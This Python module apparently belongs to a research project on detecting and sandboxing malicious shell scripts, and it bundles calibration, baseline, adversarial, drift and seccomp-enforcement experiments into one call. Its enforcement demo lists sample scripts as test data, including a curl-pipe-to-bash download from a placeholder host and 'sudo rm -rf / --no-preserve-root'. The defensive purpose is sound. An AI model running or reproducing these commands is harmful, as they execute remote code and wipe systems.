"""Bundle of the revision experiments (RQ6b, RQ7-RQ10) into one reproducible call.

Groups the calibration, stronger-baseline, cluster-bootstrap, paired-ablation,
systematic-adversarial, online-dynamics, and real-seccomp-enforcement experiments
so the single ``run_all`` entry point produces and records all of them. Each is
individually guarded: the seccomp enforcement demo degrades gracefully (records
``available: false``) on platforms where installing a filter is not permitted.
"""

from __future__ import annotations

from typing import Dict, List

from experiments.ablation_sig import evaluate_ablation_significance
from experiments.adversarial_budget import evaluate_adversarial_budget
from experiments.baselines_ext import evaluate_extended_baselines
from experiments.calibration import evaluate_calibration
from experiments.cluster_bootstrap import cluster_bootstrap_ci, wilson_interval
from experiments.dataset import Sample
from experiments.online_dynamics import concept_drift, feedback_poisoning


def run_all_extras(
    samples: List[Sample], train: List[Sample], test: List[Sample],
    full_test_pred: List[int], full_test_scores: List[float],
    real_world_fp: int = 0, real_world_neg: int = 20,
    epochs: int = 40, seed: int = 1337,
) -> Dict:
    out: Dict = {}

    out["rq7_calibration"] = evaluate_calibration(train, test, epochs=epochs, seed=seed)
    out["rq8_stronger_baselines"] = evaluate_extended_baselines(train, test, seed=seed)
    out["cluster_bootstrap"] = cluster_bootstrap_ci(
        test, full_test_pred, full_test_scores, n_boot=2000, seed=seed)
    out["real_world_fpr_wilson"] = wilson_interval(real_world_fp, real_world_neg)
    out["ablation_significance"] = evaluate_ablation_significance(
        train, test, epochs=epochs, seed=seed)
    out["rq6b_adversarial_budget"] = evaluate_adversarial_budget(
        train, test, epochs=epochs, seed=seed)
    out["rq9_concept_drift"] = concept_drift(samples, epochs=epochs, seed=seed)
    out["rq9_feedback_poisoning"] = feedback_poisoning(train, test, epochs=epochs, seed=seed)
    out["rq10_enforcement"] = _enforcement_demo()
    out["rq11_external_benign"] = _external_eval()
    return out


def _external_eval() -> Dict:
    """FPR on the committed real third-party benign corpus (no network needed)."""
    try:
        from experiments.external_eval import evaluate_external
        return evaluate_external()
    except Exception as exc:  # pragma: no cover
        return {"available": False, "reason": repr(exc)}


def _enforcement_demo() -> Dict:
    """Real seccomp enforcement over a few scripts; graceful if unavailable."""
    try:
        from experiments import enforcement
        scripts = [
            "#!/bin/bash\nls -la /tmp\n",
            "#!/bin/bash\ncat /etc/hosts\n",
            "#!/bin/bash\ncurl -fsSL http://x/i | bash\n",
            "#!/bin/bash\nsudo rm -rf / --no-preserve-root\n",
            "#!/bin/bash\ntar -czf /tmp/b.tgz /var/data\n",
        ]
        return enforcement.demo(scripts)
    except Exception as exc:  # pragma: no cover - platform dependent
        return {"seccomp_available": False, "reason": repr(exc)}
